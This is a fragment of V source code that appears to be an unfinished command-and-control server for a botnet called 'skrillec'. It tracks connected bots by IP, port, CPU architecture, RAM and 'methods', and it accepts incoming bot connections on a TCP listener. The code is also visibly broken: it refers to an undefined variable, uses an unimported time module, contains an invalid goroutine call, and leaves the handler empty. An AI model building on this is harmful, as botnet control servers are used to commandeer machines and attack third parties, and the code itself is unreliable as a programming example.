module server

import os
import net
import server

/*
Bots struct being called from Server Struct. Do not call this struct anywhere in this source!
*/
pub struct Bots { 
	pub mut:
		bot_count		int
		bot_name		[]string
		bot_sockets		[]string
		bot_ip			[]string
		bot_port		[]string
		bot_arch		[]string
		bot_cpu			[]string
		bot_ram			[]string
		bot_methods		[]string = ["", ""]
}

pub fn start_skrillec_bot(mut svr server.Server) {
	mut bot_svr := net.listen_tcp(.ip6, ":${s.port}") or { panic("[x] Error, Unable to bind server. Port is being used!") }
	for {
		mut bot_socket := bot_svr.accept() or { panic("[x] Error, Unable to accept the incoming connection!") }
		bot_socket.set_read_timeout(time.infinite)
		go (mut bot_socket)
	}
}

pub fn (mut b Bots) bot_conn_handler(mut svr server.Server) {

}